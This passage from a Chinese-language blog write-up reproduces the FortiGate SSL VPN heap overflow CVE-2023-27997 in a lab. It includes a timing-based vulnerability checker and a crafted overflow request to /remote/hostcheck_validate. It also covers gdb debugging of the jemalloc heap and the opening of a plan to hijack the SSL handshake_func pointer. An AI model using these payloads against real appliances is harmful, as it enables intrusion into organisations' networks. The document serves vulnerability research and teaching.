ssl vpn?"</span></span><br><span class="line">    salt = matches[<span class="number">0</span>].encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># allocations of size 0xe000+1-0x10000 are all in the same size class</span></span><br><span class="line">    <span class="comment"># we leave a 2KiB gap after our allocation but before the next chunk, so vulnerable devices will only corrupt unused memory</span></span><br><span class="line">    alloc_size = <span class="number">0xF800</span></span><br><span class="line"></span><br><span class="line">    overflow = []</span><br><span class="line">    regular = []</span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(REQUESTS_PER_GROUP):</span><br><span class="line">        r1 = make_req(s, baseurl, salt, alloc_size, alloc_size + <span class="number">0xF0</span>)</span><br><span class="line">        overflow.append(r1.elapsed.microseconds)</span><br><span class="line"></span><br><span class="line">        r2 = make_req(s, baseurl, salt, alloc_size, alloc_size // <span class="number">2</span>)</span><br><span class="line">        regular.append(r2.elapsed.microseconds)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">20</span> <span class="keyword">and</span> i % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            nr, no, t = check_stats(regular, overflow)</span><br><span class="line">            <span class="keyword">if</span> nr &gt; <span class="number">20</span> <span class="keyword">and</span> no &gt; <span class="number">20</span> <span class="keyword">and</span> t.pvalue &lt; <span class="number">0.001</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    _, _, t_stat = check_stats(regular, overflow)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> t_stat.pvalue &gt; <span class="number">0.001</span> <span class="keyword">or</span> (-<span class="number">2</span> &lt; t_stat.statistic &lt; <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"WARNING: Low confidence results."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> t_stat.statistic &lt; -<span class="number">0.5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Patched"</span></span><br><span class="line">    <span class="keyword">elif</span> t_stat.statistic &gt; <span class="number">0.5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Vulnerable"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Unknown"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Usage: detect {} &lt;IP&gt; &lt;PORT&gt;"</span>.<span class="built_in">format</span>(os.path.basename(__file__)))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    baseurl = <span class="string">"https://{}:{}"</span>.<span class="built_in">format</span>(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Checking "</span> + baseurl)</span><br><span class="line">    <span class="built_in">print</span>(check_target(baseurl))</span><br></pre></td></tr></table></figure></div>



<p>先来对函数进行分析</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen_enc_hdr</span>(<span class="params">salt, l</span>):</span><br><span class="line">    magic = <span class="string">b"GCC is the GNU Compiler Collection."</span></span><br><span class="line">    ks = hashlib.md5(salt + <span class="string">b"00bfbfbf"</span> + magic).digest()</span><br><span class="line">    length = struct.pack(<span class="string">"&lt;H"</span>, l)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"00bfbfbf{:02x}{:02x}"</span>.<span class="built_in">format</span>(length[<span class="number">0</span>] ^ ks[<span class="number">0</span>], length[<span class="number">1</span>] ^ ks[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_req</span>(<span class="params">session, baseurl, salt, allocsize, reqsize</span>):</span><br><span class="line">    payload = gen_enc_hdr(salt, reqsize) + <span class="string">"41"</span> * allocsize</span><br><span class="line">    payload = <span class="string">"ajax=1&amp;username=test&amp;realm=&amp;enc="</span> + payload</span><br><span class="line">    r = session.post(</span><br><span class="line">        baseurl + <span class="string">"/remote/hostcheck_validate"</span>,</span><br><span class="line">        headers={<span class="string">"content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>},</span><br><span class="line">        verify=<span class="literal">False</span>,</span><br><span class="line">        data=payload,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure></div>

<p><code>gen_enc_hdr(salt, reqsize) + "41" * allocsize</code>用来生成一个合法的<code>enc</code>请求内容，<code>gen_enc_hdr</code>用来生成一个请求头，即下图中的<code>SEED</code>和<code>SIZE</code>的内容，<code>SEED</code> 对应上面函数的内容为<code>00bfbfbf</code>，<code>SIZE</code>对应上面函数的内容为<code>length[0] ^ ks[0], length[1] ^ ks[1]</code>，需要注意的是下面的数据都是字符，比如<code>SEED</code>是由八个十六进制字符表示，并不是对应内存中的4个字节，这个需要注意一下。</p>
<p>最后通过 <code>r</code> 构造整个POST请求包发送给<code>/remote/hostcheck_validate</code>进行漏洞验证</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_14-22-00.png" alt="nipaste_2025-02-24_14-22-0"></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reject_outliers</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># This rejects ~25% of responses, but gives us much better sensitivity by filtering out random spikes in latency</span></span><br><span class="line">    q3 = np.quantile(data, <span class="number">0.75</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x &lt;= q3, data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_stats</span>(<span class="params">regular, overflow</span>):</span><br><span class="line">    overflow = reject_outliers(overflow)</span><br><span class="line">    regular = reject_outliers(regular)</span><br><span class="line">    t_stat = ttest_ind(overflow, regular, equal_var=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(overflow), <span class="built_in">len</span>(regular), t_stat</span><br></pre></td></tr></table></figure></div>

<p>上面这个函数其实如果看了<a class="link" target="_blank" rel="noopener" href="https://bishopfox.com/blog/cve-2023-27997-vulnerability-scanner-fortigate">原博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中的解释，就很容易理解了，该脚本的目标是在检测漏洞（触发）的过程中，依然能够保持服务能够正常进行，不对服务造成破坏，该服务是通过计算请求包响应的timing来检测是否存在漏洞，在原漏洞函数中，如果通过检测之后，存在大量的md5解密计算，依照漏洞原理，若存在漏洞，则会绕过检测，尝试执行大量md5解密，这样其响应的时间比较长，但是作者考虑到网络环境中噪音的影响，所以对一些延迟比较高的数据（0.75）进行了过滤，之后进行一个t检验，判断显著性差异。</p>
<p>清楚了这些函数的作用，后面的<code>check_target</code>自然也就清楚了，我们可以尝试增加一些输出，来看看具体的表现</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_14-44-11.png" alt="nipaste_2025-02-24_14-44-1"></p>
<p>通过检测，目标靶机也确实存在该漏洞，既然已经确定存在该漏洞，那下一步我们继续重点关注其漏洞触发及其利用。</p>
<h3 id="Debug-vuln"><a href="#Debug-vuln" class="headerlink" title="Debug vuln"></a>Debug vuln</h3><p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_14-56-26.png" alt="nipaste_2025-02-24_14-56-2"></p>
<p>漏洞程序是被链接到<code>init</code>程序中的，所以我们静态分析的时候分析<code>init</code>程序就好了</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_14-57-58.png" alt="nipaste_2025-02-24_14-57-5"></p>
<p>具体怎么在 ida 里面找这个函数（如果没有符号），可以通过上图搜寻上图中的字符串来定位该函数，进入到上图红框中的函数，就是我们要分析的漏洞函数啦。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_15-00-39.png" alt="nipaste_2025-02-24_15-00-3"></p>
<p>这里就对应的就是漏洞函数，这里就不详细解释说明了，我们具体来看看怎么调试。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_15-03-02.png" alt="nipaste_2025-02-24_15-03-0"></p>
<p>在一个终端执行上述命令，再起另外一个gdb调试终端，执行下图中的命令</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_15-03-29.png" alt="nipaste_2025-02-24_15-03-2"></p>
<p>然后就可以看见调试界面了，</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_15-04-44.png" alt="nipaste_2025-02-24_15-04-4"></p>
<p>构造如下payload发送过去</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">socks = []</span><br><span class="line">_sk = create_ssl_ctx()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"enc="</span> + gen_enc_data(get_salt(_sk), <span class="string">b'deadbeef'</span>, <span class="number">0x1f00</span>, <span class="string">b'A'</span>*(<span class="number">0x1000</span>-<span class="number">0x18</span>-<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">rq = <span class="string">b"POST "</span> + path + <span class="string">b" HTTP/1.1\r\nHost: 192.168.127.133\r\nContent-Length: "</span> + \</span><br><span class="line">        <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode() + \</span><br><span class="line">            <span class="string">b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF8\r\nAccept: */*\r\n\r\n"</span>+payload</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rq)</span><br><span class="line">_sk.sendall(rq)</span><br><span class="line">response = _sk.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line">_sk.close() </span><br></pre></td></tr></table></figure></div>

<p>发送的data长度控制在0x1000-0x18-0x7，0x18为jemalloc分配堆块的标头长度，0x7为4字节seed+2字节size+1字节终止符，通过下图中的<code>je_malloc</code>参数我们可以确定最终申请的堆块大小是0x1000：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_21-29-57.png" alt="nipaste_2025-03-02_21-29-5"></p>
<p>分配堆块之后，堆块内容被填充如下图所示（md5解密后）：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_21-33-26.png" alt="nipaste_2025-03-02_21-33-2"></p>
<p>不妨再来看看<code>parse_enc_data</code>漏洞函数中初始计算长度是怎么样的</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_21-41-22.png" alt="nipaste_2025-03-02_21-41-2"></p>
<p>上图为静态分析中的代码部分，对应下图</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_21-43-22.png" alt="nipaste_2025-03-02_21-43-2"></p>
<p>可以看到<code>strlen</code>对应的指针指向的内容就是我们脚本中<code>enc</code>参数传递的字符串，返回值为<code>0x1fce</code></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_21-45-36.png" alt="nipaste_2025-03-02_21-45-3"></p>
<p>即对应的<code>in_len</code>值为0x1fce，这里之所以关注该值，为了绕过判断，我们需要满足 </p>
<blockquote>
<p>chunk_size(0x1000) &lt; given_len(0x1f00: 前面脚本中有设置) &lt; in_len - 5</p>
</blockquote>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_21-53-12.png" alt="nipaste_2025-03-02_21-53-1"></p>
<p>在过掉判断之后，才会对我们前面<code>je_malloc</code>申请的0x1000的堆块进行解密处理（下图中应该是解密逻辑），</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_21-57-05.png" alt="nipaste_2025-03-02_21-57-0"></p>
<p>具体堆块中的内容如下所示：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_22-11-22.png" alt="nipaste_2025-03-02_22-11-2"></p>
<p>我们在解密逻辑的末尾打个断点直接看解密后的数据即可：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_22-13-35.png" alt="nipaste_2025-03-02_22-13-3"></p>
<p>可以看到我们的数据已经被解密成我们初始发送过去的数据了，但是这时候我们要关注另外一个东西，就是这里存在的溢出漏洞，相信我们之前已经了解过这个漏洞，虽然我们申请的堆块是0x1000大小的，但是对应的解密的长度却是按照<code>given_len</code>来的，这一点我们可以通过直接观察0x1000之后的堆块内容变化即可：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_22-17-13.png" alt="nipaste_2025-03-02_22-17-1"></p>
<p>原本如上图所示，但是在被错误解析之后，该部分的内容如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-02_22-18-09.png" alt="nipaste_2025-03-02_22-18-0"></p>
<p>至此，我们通过一个简单的数据包发送，搞清楚了这块的函数处理逻辑，包括漏洞造成的效果，后面我们将利用这一点来实现漏洞利用。</p>
<h3 id="DBG"><a href="#DBG" class="headerlink" title="DBG"></a>DBG</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep y   0x00000000015adef9 		my_je_malloc</span><br><span class="line">	breakpoint already hit 1 time</span><br><span class="line">2       breakpoint     keep y   0x000000000155326b 		je_malloc</span><br><span class="line">	breakpoint already hit 1 time</span><br><span class="line">6       breakpoint     keep y   0x00000000015ae05f 		decrypt_over</span><br><span class="line">	breakpoint already hit 1 time</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep n   0x00007fce339713d0 &lt;SSL_new&gt;</span><br><span class="line">	breakpoint already hit 3 times</span><br><span class="line">2       breakpoint     keep n   0x00000000015adef9 </span><br><span class="line">	breakpoint already hit 19 times</span><br><span class="line">4       breakpoint     keep y   0x000000000155326b </span><br><span class="line">	breakpoint already hit 4 times</span><br><span class="line">5       breakpoint     keep y   0x0000000001553270 </span><br><span class="line">	breakpoint already hit 1 time</span><br><span class="line">6       breakpoint     keep y   0x00007fce33971402 &lt;SSL_new+50&gt;</span><br><span class="line">7       breakpoint     keep n   0x00007fce3396edf0 &lt;SSL_do_handshake&gt;</span><br><span class="line">	breakpoint already hit 1 time</span><br><span class="line">8       breakpoint     keep n   0x00000000015ae05f </span><br><span class="line">	breakpoint already hit 1 time</span><br><span class="line">9       breakpoint     keep y   0x00007fce33957f53 </span><br><span class="line">	breakpoint already hit 4 times</span><br></pre></td></tr></table></figure></div>



<p><strong>Jemalloc</strong></p>
<p>该程序使用的是<code>Jemalloc</code>堆分配器，我这里使用的是python中的gdb模块来进行调试输出，主要就是用来输出堆块的分配地址</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PrintRegisterAndMemoryAtAddress</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, address, register, output_filename, name</span>):</span><br><span class="line">        <span class="comment"># 设置断点</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(<span class="string">f"*<span class="subst">{address}</span>"</span>, gdb.BP_BREAKPOINT, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">True</span>  <span class="comment"># 隐藏断点信息</span></span><br><span class="line">        self.register = register  <span class="comment"># 寄存器名称</span></span><br><span class="line">        self.output_filename = output_filename  <span class="comment"># 输出文件名</span></span><br><span class="line">        self.name = name  <span class="comment"># 名称</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 获取指定寄存器的值</span></span><br><span class="line">            register_value = gdb.parse_and_eval(<span class="string">f"$<span class="subst">{self.register}</span>"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 确保寄存器值为无符号整数</span></span><br><span class="line">            <span class="keyword">if</span> register_value.<span class="built_in">type</span>.code == gdb.TYPE_CODE_INT <span class="keyword">and</span> register_value.<span class="built_in">type</span>.name.startswith(<span class="string">"unsigned"</span>):</span><br><span class="line">                register_value = <span class="built_in">int</span>(register_value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                register_value = <span class="built_in">int</span>(register_value.cast(gdb.lookup_type(<span class="string">"unsigned long"</span>)))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 读取寄存器指向的内存值（假设 64 位整数）</span></span><br><span class="line">            memory_value = gdb.inferiors()[<span class="number">0</span>].read_memory(register_value, <span class="number">8</span>)</span><br><span class="line">            memory_value = <span class="built_in">int</span>.from_bytes(memory_value, byteorder=<span class="string">"little"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 每次写入时打开文件、写入并关闭文件</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.output_filename, <span class="string">'a'</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">                output_file.write(</span><br><span class="line">                    <span class="string">f"[Breakpoint hit] <span class="subst">{self.name}</span>: <span class="subst">{self.register}</span>=0x<span class="subst">{register_value:016x}</span>, "</span></span><br><span class="line">                    <span class="string">f"Value at <span class="subst">{self.register}</span>=0x<span class="subst">{memory_value:016x}</span>\n"</span></span><br><span class="line">                )</span><br><span class="line">        <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.output_filename, <span class="string">'a'</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">                output_file.write(</span><br><span class="line">                    <span class="string">f"[Breakpoint hit] <span class="subst">{self.name}</span>: <span class="subst">{self.register}</span>=0x<span class="subst">{register_value:016x}</span>, "</span></span><br><span class="line">                    <span class="string">f"Value at <span class="subst">{self.register}</span>=UNREADABLE\n"</span></span><br><span class="line">                )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># 如果解析失败，写入错误信息</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.output_filename, <span class="string">'a'</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">                output_file.write(<span class="string">f"[Breakpoint hit] <span class="subst">{self.name}</span>: Error: <span class="subst">{e}</span>\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 不暂停程序，继续执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户输入断点地址、寄存器名称和名称</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_register_and_memory_watch</span>(<span class="params">address, register, output_filename, name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        PrintRegisterAndMemoryAtAddress(address, register, output_filename, name)</span><br><span class="line">        <span class="comment"># 每次写入时打开文件、写入并关闭文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">'a'</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">            output_file.write(<span class="string">f"Breakpoint set at address: <span class="subst">{address}</span> with register: <span class="subst">{register}</span> and name: <span class="subst">{name}</span>\n"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">'a'</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">            output_file.write(<span class="string">f"Error setting breakpoint: <span class="subst">{e}</span>\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册命令</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WatchRegisterAndMemoryCommand</span>(gdb.Command):</span><br><span class="line">    <span class="string">"""Set a breakpoint at a specific address and print a register and memory at the register when hit.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Usage: watch_register_c ADDRESS REGISTER NAME</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(<span class="string">"watch_register_c"</span>, gdb.COMMAND_USER)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invoke</span>(<span class="params">self, arg, from_tty</span>):</span><br><span class="line">        args = arg.split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(args) != <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Usage: watch_register_c ADDRESS REGISTER VAR_NAME FILENAME"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        address, register, name, outputfile = args</span><br><span class="line">        set_register_and_memory_watch(address, register, outputfile, name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册 GDB 命令</span></span><br><span class="line">WatchRegisterAndMemoryCommand()</span><br><span class="line"></span><br><span class="line">gdb.write(<span class="string">"Command 'watch_register_c' loaded. Use 'Usage: watch_register_c ADDRESS REGISTER VAR_NAME FILENAME' to set a breakpoint and log a register and its memory value.\n"</span>)</span><br></pre></td></tr></table></figure></div>





<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>利用流程想必已经很清楚了，就是通过溢出写，来实现劫持 SSL 结构体中的 <code>handfunc</code> 指针。</p>
<p><strong>通过给定salt，target_byte，offset 爆破出满足条件的密钥流</strong></p>
<p>如何理解满足条件的密钥流，这实际上在原作者中的博客有提到，这是因为我们想通过遍历不同的<code>seed</code>来找到<strong>密钥流中对应偏移的字</strong>节是否与我们想要覆盖的内存内容<code>target_byte</code>是否是一致的。这样我们就可以实现在溢出可控位置处写任意一字节，原文中也有提到，<code>Jemalloc</code>中的堆块遵循后进先出，所以说即使再将一个堆块释放掉时，再次申请依然有很大概率会得到相同的堆块，这就意味着我们可以任意写的字节数可以大大增加，不过这个过程肯定也伴随着噪音，所以说失败概率也是有的（在我的 Fortigaet7.05 的测试环境中成功率接近100%）。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-02-24_16-43-26.png" alt="nipaste_2025-02-24_16-43-2"></p>
<p>SSL 结构体内容如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span> {</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,</span></span><br><span class="line"><span class="comment">    * DTLS1_VERSION)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">int</span> version;</span><br><span class="line">    <span class="comment">/* SSLv3 */</span></span><br><span class="line">    <span class="type">const</span> SSL_METHOD *method;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * There are 2 BIO's even though they are normally both the same. This</span></span><br><span class="line"><span class="comment">    * is so data can be read and written to different handlers</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/* used by SSL_read */</span></span><br><span class="line">    BIO *rbio;</span><br><span class="line">    <span class="comment">/* used by SSL_write */</span></span><br><span class="line">    BIO *wbio;</span><br><span class="line">    <span class="comment">/* used during session-id reuse to concatenate messages */</span></span><br><span class="line">    BIO *bbio;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * This holds a variable that indicates what we were doing when a 0 or -1</span></span><br><span class="line"><span class="comment">    * is returned. This is needed for non-blocking IO so we know what</span></span><br><span class="line"><span class="comment">    * request needs re-doing when in SSL_accept or SSL_connect</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">int</span> rwstate;</span><br><span class="line">    <span class="type">int</span> (*handshake_func) (SSL *);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><code>handshake_func</code> 就是我们需要劫持的函数指针，位于结构体偏移0x30处，这里需要强调一下，在我的复现环境中 Fortigaet7.05 中的 <code>SSL</code> 结构体为 0x1c00，在 7.2版本下该结构体大小为 0x2000，所以当时在测试的时候我一度以为自己的操作过程有问题，这里特此强调一下，不必多虑。</p>
<p>断点下在<code>SSL_new</code>之后，单步跟进，一直到 <code>CRYPTO_zalloc@plt</code>，观察ssl结构体申请的大小</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_02-29-37.png" alt="nipaste_2025-03-05_02-29-3"></p>
<p>这里验证了我们的测试版本中 SSL 结构体大小为 0x1888，初始化之后的 SSL 结构体内容如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_02-32-30.png" alt="nipaste_2025-03-05_02-32-3"></p>
<p>这里来说说我们第一步要做什么</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_02-47-47.png" alt="nipaste_2025-03-05_02-47-4"></p>
<p>这里需要创建多个 sock，然后发送 HTTP 请求，由于SSL结构体比较大，所以说这块堆区的噪音相对较小，然后就会产生如上的堆排布（上述堆喷策略可能与原作者中采用的方法不一致——即HTTP和SSL交错分配的堆布局，不过不用担心，后续笔者通过一个小的堆风水依然是覆盖相邻的下一个堆块），参考代码如下：</p>
